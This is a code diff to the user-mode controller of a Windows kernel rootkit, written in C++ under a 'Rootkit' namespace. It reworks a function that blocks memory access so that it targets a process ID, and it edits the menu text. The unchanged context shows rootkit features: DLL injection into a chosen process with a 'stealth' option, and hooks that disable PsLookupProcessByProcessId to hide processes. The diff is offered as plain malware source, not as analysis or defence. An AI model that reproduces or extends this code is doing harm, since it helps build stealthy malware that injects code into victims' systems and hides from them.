@@ -148,11 +148,11 @@ namespace Rootkit {
         );
     }
 
-    bool BlockAddress(HANDLE driver_handle, ADDRESS_RANGE addressToBlock) {
+    bool BlockAddress(HANDLE driver_handle, UINT32 PID) {
         DWORD bytes_returned = 0;
         // Properly declare all parameters for DeviceIoControl
         Request r;
-        r.addressToBlock = addressToBlock;
+        r.process_id = UlongToHandle(PID);
         return DeviceIoControl(
             driver_handle,
             codes::BlockAddress,
@@ -776,6 +776,7 @@ int main() {
             std::wcin.getline(FilePath, MAX_PATH);
             std::wcout << L"Enter a PID: ";
             std::cin >> pid;
+            std::cin.ignore();
             bool stealth = AskForStealth();
             std::wcout << L"[!] Sending Message to Driver.\n";
             Rootkit::InjectDLL(driver_handle, FilePath, pid, stealth);
@@ -798,7 +799,7 @@ int main() {
             while (enabled) {
                 system("cls");
                 std::cout << "=== HOOKING UTILS ===\n";
-                std::cout << "1. Block Address Ranges\n";
+                std::cout << "1. Block Address Access for a PID.\n";
                 std::cout << "2. Disable Process Enumeration -- Disables PsLookupProcessByProcessId for the PID -- NOTE: ANY KERNEL FUNCTION THAT USES THIS WONT BE ABLE TO INTERACT WITH THE PROCESS, Including this rootkit.\n";
                 std::cout << "3. Delete all hooks and revert.\n";
                 std::cout << "===========================\n";
@@ -807,10 +808,9 @@ int main() {
 
                 switch (choiceProtect) {
                 case 1:
-                    std::cout << "Enter address range to block (hex e.g 0x1000-0x2000): ";
-                    ADDRESS_RANGE addressToBlock = ReadHexAddressRange();
-                    std::wcout << L"\n[!] Sending Message to Driver.\n";
-                    Rootkit::BlockAddress(driver_handle, addressToBlock);
+                    std::cout << "Enter the PID to block memory access for: ";
+                    std::cin >> pidProtect;
+                    Rootkit::BlockAddress(driver_handle, pidProtect);
                     Sleep(5000);
                     break;
                 case 2:
